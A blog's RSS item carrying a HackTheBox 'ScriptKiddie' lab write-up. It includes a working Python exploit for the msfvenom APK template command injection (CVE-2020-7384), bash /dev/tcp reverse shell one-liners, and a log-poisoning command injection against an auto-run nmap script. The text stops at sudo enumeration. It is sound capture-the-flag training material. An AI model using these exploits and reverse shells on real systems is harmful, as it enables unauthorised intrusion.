<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>CVE-2020-7384 on Ef&#39;s log</title>
    <link>https://fahmifj.github.io/tags/cve-2020-7384/</link>
    <description>Recent content in CVE-2020-7384 on Ef&#39;s log</description>
    <generator>Hugo -- gohugo.io</generator>
    <lastBuildDate>Mon, 14 Jun 2021 07:57:37 +0700</lastBuildDate><atom:link href="https://fahmifj.github.io/tags/cve-2020-7384/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>HackTheBox - ScriptKiddie</title>
      <link>https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/</link>
      <pubDate>Mon, 14 Jun 2021 07:57:37 +0700</pubDate>
      
      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-scriptkiddie/</guid>
      <description>Exploiting exploitation tools</description>
      <content:encoded><![CDATA[<p>ScriptKiddie consists of two exploitations on Metasploit framework. The first one is exploiting <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=2020-7384">CVE-2020-7384</a>, which allows me to gain a foothold by crafting a malicious APK that executes a reverse shell when used as APK template on <code>msfvenom</code>. There is a script which automatically runs a <code>nmap</code> scan against a host from a log file. The script can be exploited by poisoning the log with a reverse shell. The second is exploiting sudo privileges on <code>msfconsole</code>  to gain a root access.</p>
<h3 id="skills-learned">Skills Learned</h3>
<ul>
<li>Exploiting Metasploit CVE-2020-7384</li>
<li>Exploiting custom script</li>
</ul>
<h3 id="tools">Tools</h3>
<ul>
<li>Nmap</li>
<li>CVE-2020-7384 <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">PoC</a></li>
</ul>
<h2 id="reconnaissance">Reconnaissance</h2>
<h3 id="nmap">Nmap</h3>
<p>Full port scan with <code>nmap</code> discovers two open ports: SSH on port 22, and UPnP on port 5000</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
$ nmap -p- --min-rate <span style="color:#ae81ff">1000</span> --reason -oA nmap/10-tcp-allport 10.10.10.226 
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-13 20:42 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.226
Host is up, received echo-reply ttl <span style="color:#ae81ff">63</span> <span style="color:#f92672">(</span>0.065s latency<span style="color:#f92672">)</span>.
Not shown: <span style="color:#ae81ff">65533</span> closed ports
Reason: <span style="color:#ae81ff">65533</span> resets
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl <span style="color:#ae81ff">63</span>
5000/tcp open  upnp    syn-ack ttl <span style="color:#ae81ff">63</span>

Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 45.79 seconds
</code></pre></div><p>With default script scan, <code>nmap</code> identifies that port 5000 is actually a web application hosted using Python.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «scriptkiddie» «10.10.14.31» 
$ nmap -p22,5000 -sC -sV -oA nmap/10-tcp-allport-script 10.10.10.226
Starting Nmap 7.80 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2021-06-13 20:44 EDT
Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.226
Host is up <span style="color:#f92672">(</span>0.056s latency<span style="color:#f92672">)</span>.

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
5000/tcp open  http    Werkzeug httpd 0.16.1 <span style="color:#f92672">(</span>Python 3.8.5<span style="color:#f92672">)</span>
|_http-server-header: Werkzeug/0.16.1 Python/3.8.5
|_http-title: k1d<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#ae81ff">5</span> h4ck3r t00l5
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 11.66 second
</code></pre></div><h2 id="enumeration">Enumeration</h2>
<h3 id="tcp-5000---website">TCP 5000 - Website</h3>
<p>The site provides several online hacking tools.</p>
<p><img class="img-container" src="imgs/image-20210614081410024.png" alt="image-20210614081410024"  />
</p>
<p>The <code>nmap</code> tool can be used to scan against itself.</p>
<p><img class="img-container" src="imgs/image-20210614081542603.png" alt="image-20210614081542603"  />
</p>
<p>The IP field doesn&rsquo;t accept others inputs except IPv4, so I don&rsquo;t thing it can be abused. But I&rsquo;ll note the <code>nmap</code> version.</p>
<p>The next tool is <code>msfvenom</code>, it can be used to generate a binary for sending a reverse shell.  It has three options on the OS: Windows, Linux and Android. There is also a template option, for example, you can embed your payload to Windows&rsquo;s <code>calc.exe</code>.</p>
<p><img class="img-container" src="imgs/image-20210614082411239.png" alt="image-20210614082411239"  />
</p>
<p>Somehow, it can only generates payload for Windows and Android.</p>
<p><img class="img-container" src="imgs/image-20210614082153746.png" alt="image-20210614082153746"  />
</p>
<p>The payload is available at <code>http://10.10.10.226:5000/static/payloads/[here]</code> for 5 mins.</p>
<p>The last tool is <code>searchsploit</code>, I tried to stack the commands but it returns this message</p>
<p><img class="img-container" src="imgs/image-20210614083303308.png" alt="image-20210614083303308"  />
</p>
<h3 id="finding-tools-vulnerabilities">Finding Tools Vulnerabilities</h3>
<p>I can&rsquo;t get the tools version except for <code>nmap</code>.  So, I searched some exploits before the box release (February 2021) on Exploit-DB  and here is what I found.</p>
<p><img class="img-container" src="imgs/image-20210614084800963.png" alt="image-20210614084800963"  />
</p>
<p>And that is probably what I need.</p>
<p>I typed &ldquo;msfvenom&rdquo; on the site too, and the exploit also appeared there.</p>
<p><img class="img-container" src="imgs/image-20210614085320477.png" alt="image-20210614085320477"  />
</p>
<h2 id="foothold">Foothold</h2>
<h3 id="shell-as-kid">Shell as kid</h3>
<h4 id="mfvenom-cve-2020-7384">Mfvenom CVE-2020-7384</h4>
<p>I&rsquo;ll use <a href="https://github.com/justinsteven/advisories/blob/master/2020_metasploit_msfvenom_apk_template_cmdi.md">this exploit</a>, but I&rsquo;ll change the payload and the template location to my current working directory.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
<span style="color:#f92672">import</span> subprocess
<span style="color:#f92672">import</span> tempfile
<span style="color:#f92672">import</span> os
<span style="color:#f92672">from</span> base64 <span style="color:#f92672">import</span> b32encode

<span style="color:#75715e"># Change me</span>
payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;&#39;</span>

<span style="color:#75715e"># b32encode to avoid badchars (keytool is picky)</span>
<span style="color:#75715e"># thanks to @fdellwing for noticing that base64 can sometimes break keytool</span>
<span style="color:#75715e"># &lt;https://github.com/justinsteven/advisories/issues/2&gt;</span>
payload_b32 <span style="color:#f92672">=</span> b32encode(payload<span style="color:#f92672">.</span>encode())<span style="color:#f92672">.</span>decode()
dname <span style="color:#f92672">=</span> <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;CN=&#39;|echo </span><span style="color:#e6db74">{</span>payload_b32<span style="color:#e6db74">}</span><span style="color:#e6db74"> | base32 -d | sh #&#34;</span>

print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Manufacturing evil apkfile&#34;</span>)
print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Payload: </span><span style="color:#e6db74">{</span>payload<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;-dname: </span><span style="color:#e6db74">{</span>dname<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
print()

tmpdir <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./&#34;</span>
apk_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(tmpdir, <span style="color:#e6db74">&#34;evil.apk&#34;</span>)
empty_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(tmpdir, <span style="color:#e6db74">&#34;empty&#34;</span>)
keystore_file <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(tmpdir, <span style="color:#e6db74">&#34;signing.keystore&#34;</span>)
storepass <span style="color:#f92672">=</span> keypass <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;password&#34;</span>
key_alias <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;signing.key&#34;</span>
open(empty_file, <span style="color:#e6db74">&#34;w&#34;</span>)<span style="color:#f92672">.</span>close()
subprocess<span style="color:#f92672">.</span>check_call([<span style="color:#e6db74">&#34;zip&#34;</span>, <span style="color:#e6db74">&#34;-j&#34;</span>, apk_file, empty_file])

subprocess<span style="color:#f92672">.</span>check_call([<span style="color:#e6db74">&#34;keytool&#34;</span>, <span style="color:#e6db74">&#34;-genkey&#34;</span>, <span style="color:#e6db74">&#34;-keystore&#34;</span>, keystore_file, <span style="color:#e6db74">&#34;-alias&#34;</span>, key_alias, <span style="color:#e6db74">&#34;-storepass&#34;</span>, storepass,
                       <span style="color:#e6db74">&#34;-keypass&#34;</span>, keypass, <span style="color:#e6db74">&#34;-keyalg&#34;</span>, <span style="color:#e6db74">&#34;RSA&#34;</span>, <span style="color:#e6db74">&#34;-keysize&#34;</span>, <span style="color:#e6db74">&#34;2048&#34;</span>, <span style="color:#e6db74">&#34;-dname&#34;</span>, dname])
subprocess<span style="color:#f92672">.</span>check_call([<span style="color:#e6db74">&#34;jarsigner&#34;</span>, <span style="color:#e6db74">&#34;-sigalg&#34;</span>, <span style="color:#e6db74">&#34;SHA1withRSA&#34;</span>, <span style="color:#e6db74">&#34;-digestalg&#34;</span>, <span style="color:#e6db74">&#34;SHA1&#34;</span>, <span style="color:#e6db74">&#34;-keystore&#34;</span>, keystore_file,
                       <span style="color:#e6db74">&#34;-storepass&#34;</span>, storepass, <span style="color:#e6db74">&#34;-keypass&#34;</span>, keypass, apk_file, key_alias])
print()
print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;[+] Done! apkfile is at </span><span style="color:#e6db74">{</span>apk_file<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Do: msfvenom -x </span><span style="color:#e6db74">{</span>apk_file<span style="color:#e6db74">}</span><span style="color:#e6db74"> -p android/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -o /dev/null&#34;</span>)
</code></pre></div><p>It produces a file called <code>evil.apk</code> . It also shows the exploit commands.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ python3 exploit_msfvenom.py
<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Manufacturing evil apkfile
Payload: bash -c <span style="color:#e6db74">&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9000 0&gt;&amp;1&#34;</span>
-dname: CN<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;|echo MJQXG2BAFVRSAITCMFZWQIBNNEQD4JRAF5SGK5RPORRXALZRGAXDCMBOGE2C4MZRF44TAMBQEAYD4JRREI====== | base32 -d | sh #
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">  adding: empty (stored 0%)
</span><span style="color:#e6db74">jar signed.
</span><span style="color:#e6db74">
</span><span style="color:#e6db74">Warning:
</span><span style="color:#e6db74">The signer&#39;</span>s certificate is self-signed.

<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Done! apkfile is at ./evil.apk
Do: msfvenom -x ./evil.apk -p android/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>127.0.0.1 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">4444</span> -o /dev/null
</code></pre></div><h4 id="reverse-shell---kid">Reverse shell - kid</h4>
<p>I&rsquo;ll setup a <code>nc</code> listener on port 9000, then I&rsquo;ll upload the <code>evil.apk</code> file as the template file and then I&rsquo;ll click on the generate button.</p>
<p><img class="img-container" src="imgs/image-20210614103158432.png" alt="image-20210614103158432"  />
</p>
<p>On my listener, I&rsquo;ve a shell now as user <code>kid</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"> root@kali «exploits» «10.10.14.31» 
$ nc -nvlp <span style="color:#ae81ff">9000</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">34230</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>897<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
kid@scriptkiddie:~/html$    
</code></pre></div><p><img class="img-container" src="imgs/image-20210614102941088.png" alt="image-20210614102941088"  />
</p>
<h4 id="shell-upgrade">Shell upgrade</h4>
<p>I&rsquo;ll upgrade my shell first.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31» 
$ nc -nvlp <span style="color:#ae81ff">9000</span>
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9000</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">34230</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>897<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
kid@scriptkiddie:~/html$ id
uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>kid<span style="color:#f92672">)</span>
kid@scriptkiddie:~/html$ export TERM<span style="color:#f92672">=</span>xterm
export TERM<span style="color:#f92672">=</span>xterm
kid@scriptkiddie:~/html$ which python
which python
kid@scriptkiddie:~/html$ python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
python3 -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
kid@scriptkiddie:~/html$ ^Z
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">10652</span> suspended  nc -nvlp <span style="color:#ae81ff">9000</span>
→ root@kali «exploits» «10.10.14.31» 
$ stty raw -echo; fg
<span style="color:#f92672">[</span>1<span style="color:#f92672">]</span>  + <span style="color:#ae81ff">10652</span> continued  nc -nvlp <span style="color:#ae81ff">9000</span>

kid@scriptkiddie:~/html$ 
</code></pre></div><p>User flag is done here.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/html$ cd ~
kid@scriptkiddie:~$ ls -la
total <span style="color:#ae81ff">60</span>
...&lt;SNIP&gt;...
-rw-r--r--  <span style="color:#ae81ff">1</span> kid  kid   <span style="color:#ae81ff">807</span> Feb <span style="color:#ae81ff">25</span>  <span style="color:#ae81ff">2020</span> .profile
drwx------  <span style="color:#ae81ff">2</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb <span style="color:#ae81ff">10</span> 16:11 .ssh
-rw-r--r--  <span style="color:#ae81ff">1</span> kid  kid     <span style="color:#ae81ff">0</span> Jan  <span style="color:#ae81ff">5</span> 11:10 .sudo_as_admin_successful
drwxrwxr-x  <span style="color:#ae81ff">5</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 11:03 html
drwxrwxrwx  <span style="color:#ae81ff">2</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 07:40 logs
drwxr-xr-x  <span style="color:#ae81ff">3</span> kid  kid  <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 11:48 snap
-r--------  <span style="color:#ae81ff">1</span> kid  kid    <span style="color:#ae81ff">33</span> Jun <span style="color:#ae81ff">12</span> 11:35 user.txt
</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="shell-as-pwn">Shell as pwn</h3>
<h4 id="internal-enumeration">Internal Enumeration</h4>
<p>On kid&rsquo;s home, there&rsquo;s a folder called <code>logs</code>. The <code>logs</code> folder contains one file called <code>hackers</code>, but it&rsquo;s empty.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/logs$ ls -la
total <span style="color:#ae81ff">8</span>
drwxrwxrwx  <span style="color:#ae81ff">2</span> kid kid <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 07:40 .
drwxr-xr-x <span style="color:#ae81ff">11</span> kid kid <span style="color:#ae81ff">4096</span> Feb  <span style="color:#ae81ff">3</span> 11:49 ..
-rw-rw-r--  <span style="color:#ae81ff">1</span> kid pwn    <span style="color:#ae81ff">0</span> Jun <span style="color:#ae81ff">14</span> 01:40 hackers
</code></pre></div><p>I did a quick check on the available users who have shells, and it looks like I need to escalate to <code>pwn</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
kid:x:1000:1000:kid:/home/kid:/bin/bash
pwn:x:1001:1001::/home/pwn:/bin/bash
</code></pre></div><p>Searching files owned by user <code>pwn</code> discovers one script called <code>scanlosers.sh</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ find / -type f -user pwn 2&gt;/dev/null
/home/pwn/.bash_logout
/home/pwn/.selected_editor
/home/pwn/.bashrc
/home/pwn/.profile
/home/pwn/scanlosers.sh
</code></pre></div><p>The script is writable by me.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ ls -l /home/pwn/scanlosers.sh
-rwxrwxr-- <span style="color:#ae81ff">1</span> pwn pwn <span style="color:#ae81ff">250</span> Jan <span style="color:#ae81ff">28</span> 17:57 /home/pwn/scanlosers.sh
</code></pre></div><h4 id="script-analysis">Script analysis</h4>
<p>The script is most likely linked with kid&rsquo;s hack tools website and probably can be abused with stacked command, but I need to find how the log in <code>hackers</code> file is formatted.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~$ cat /home/pwn/scanlosers.sh
<span style="color:#75715e">#!/bin/bash</span>

<span style="color:#75715e"># &lt;== Define log</span>
log<span style="color:#f92672">=</span>/home/kid/logs/hackers 

cd /home/pwn/
cat $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u | <span style="color:#66d9ef">while</span> read ip; <span style="color:#66d9ef">do</span>
    sh -c <span style="color:#e6db74">&#34;nmap --top-ports 10 -oN recon/</span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74">.nmap </span><span style="color:#e6db74">${</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> 2&gt;&amp;1 &gt;/dev/null&#34;</span> &amp;
<span style="color:#66d9ef">done</span>
<span style="color:#75715e"># &lt;== The log is cleared immediately</span>
<span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#66d9ef">$(</span>wc -l &lt; $log<span style="color:#66d9ef">)</span> -gt <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span> echo -n &gt; $log; <span style="color:#66d9ef">fi</span>
</code></pre></div><p>Looking back into the web source code, I find how the log is formatted in a function called <code>searchsploit</code>. Inserting malicious input on the kid&rsquo;s hack tools will trigger the else condition on this function, which logs date and IP.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">...&lt;</span>SNIP<span style="color:#f92672">&gt;...</span>
<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">searchsploit</span>(text, srcip):
    <span style="color:#66d9ef">if</span> regex_alphanum<span style="color:#f92672">.</span>match(text):
        result <span style="color:#f92672">=</span> subprocess<span style="color:#f92672">.</span>check_output([<span style="color:#e6db74">&#39;searchsploit&#39;</span>, <span style="color:#e6db74">&#39;--color&#39;</span>, text])
        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, searchsploit<span style="color:#f92672">=</span>result<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;UTF-8&#39;</span>, <span style="color:#e6db74">&#39;ignore&#39;</span>))
    <span style="color:#66d9ef">else</span>:
        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#39;/home/kid/logs/hackers&#39;</span>, <span style="color:#e6db74">&#39;a&#39;</span>) <span style="color:#66d9ef">as</span> f:
            f<span style="color:#f92672">.</span>write(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;[</span><span style="color:#e6db74">{</span>datetime<span style="color:#f92672">.</span>datetime<span style="color:#f92672">.</span>now()<span style="color:#e6db74">}</span><span style="color:#e6db74">] </span><span style="color:#e6db74">{</span>srcip<span style="color:#e6db74">}</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#39;</span>)
        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>, sserror<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stop hacking me - well hack you back&#34;</span>)
<span style="color:#f92672">...&lt;</span>SNIP<span style="color:#f92672">&gt;...</span>
</code></pre></div><p>I can trigger an event that logs my IP in the <code>hackers</code> file but then the logs is cleared so fast that I couldn&rsquo;t catch it with the <code>watch</code> command.</p>
<p><img class="img-container" src="imgs/image-20210614114025066.png" alt="image-20210614114025066"  />
</p>
<p>But with this, I could guess that this script is intended as a &lsquo;counter attack&rsquo;. From here, I know that <code>scanlosers.sh</code> is <strong>executed automatically</strong> after a malicious attempt is performed on the site.</p>
<p>I could generate the same log format in one line:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ python3 -c <span style="color:#e6db74">&#34;from datetime import datetime; print(f&#39;[{datetime.now()}] 127.0.0.1&#39;)&#34;</span>
<span style="color:#f92672">[</span>2021-06-14 00:43:54.924946<span style="color:#f92672">]</span> 127.0.0.1
</code></pre></div><p>To exploit the script, I have to trick this line from <code>scanlosers.sh</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u
</code></pre></div><p>What that line does is it extracts the IP address from the log.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ log<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;[2021-06-14 00:28:09.560444] 127.0.0.1&#39;</span>
→ root@kali «exploits» «10.10.14.31»
$ echo $log | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u
127.0.0.1
</code></pre></div><p>From here, I&rsquo;ll just add a semi-colon and a space before putting my reverse shell.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;
</code></pre></div><p>It becomes a stacked command.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">→ root@kali «exploits» «10.10.14.31»
$ echo <span style="color:#e6db74">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;&#34;</span> | cut -d<span style="color:#e6db74">&#39; &#39;</span> -f3- | sort -u
127.0.0.1; bash -c <span style="color:#e6db74">&#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;</span>;
</code></pre></div><p>If I map that format to this line:</p>
<pre><code>sh -c &quot;nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2&gt;&amp;1 &gt;/dev/null&quot;
</code></pre><p>It turns into this:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sh -c <span style="color:#e6db74">&#34;nmap --top-ports 10 -oN recon/127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;;.nmap 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.30/9000 0&gt;&amp;1&#39;; 2&gt;&amp;1 &gt;/dev/null&#34;</span>
</code></pre></div><h4 id="exploitation">Exploitation</h4>
<p>Since the logs is cleared automatically, I&rsquo;ll use while loop to keep inserting my malicious log to the <code>hackers</code> file and setup my listener on port 9001.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">kid@scriptkiddie:~/logs$ <span style="color:#66d9ef">while</span> sleep 0.1; <span style="color:#66d9ef">do</span> echo <span style="color:#e6db74">&#34;[2021-06-14 00:28:09.560444] 127.0.0.1; bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.31/9001 0&gt;&amp;1&#39;;&#34;</span> &gt; hackers; <span style="color:#66d9ef">done</span>
</code></pre></div><p>On my listener:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@kali «scriptkiddie» «10.10.14.31» 
$ nc -nvlp <span style="color:#ae81ff">9001</span>             
listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">9001</span> ...
connect to <span style="color:#f92672">[</span>10.10.14.31<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.226<span style="color:#f92672">]</span> <span style="color:#ae81ff">33110</span>
bash: cannot set terminal process group <span style="color:#f92672">(</span>868<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
bash: no job control in this shell
pwn@scriptkiddie:~$ id
id
uid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1001<span style="color:#f92672">(</span>pwn<span style="color:#f92672">)</span>
</code></pre></div><p><img class="img-container" src="imgs/image-20210614115903137.png" alt="image-20210614115903137"  />
</p>
<h3 id="shell-as-root">Shell as root</h3>
<h4 id="sudo---msfconsole">Sudo - msfconsole</h4>
<p>User <code>pwn</code> has sudo privileges on <code>msfconsole</code>.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">pwn@scriptkiddie:~$ sudo -l
sudo -l
Matching Defaults entries <span style="color:#66d9ef">for</span> pwn on scriptkiddie:
    env_reset, mail_badpass,
